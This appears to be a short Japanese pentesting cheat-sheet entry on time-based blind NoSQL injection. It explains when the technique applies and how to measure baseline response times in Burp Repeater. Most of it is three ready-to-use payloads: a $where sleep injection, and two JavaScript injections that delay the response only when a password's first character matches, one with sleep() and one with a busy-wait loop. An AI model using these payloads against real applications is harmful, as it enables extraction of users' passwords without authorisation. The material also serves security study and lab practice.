
###### 使用する場面

- DBエラーをトリガーしてもレスポンスに違いがない場合

###### 方法概要

1. ページを数回読み込み、基準となる読み込み時間を確認する。
	- Repeaterの右下

2. 条件が正のときレスポンス時間が遅くなるようなペイロードを注入する

- `sleep()`が使えるとき && [3. NoSQL operator injection](3.%20NoSQL%20operator%20injection.md#`$where`の場合)で`$where`を注入可能なとき
```json
{"$where": "sleep(5000)"}
```

- `sleep()`が使えるとき
```json
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

- `sleep()`が使えないとき
```javascript
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
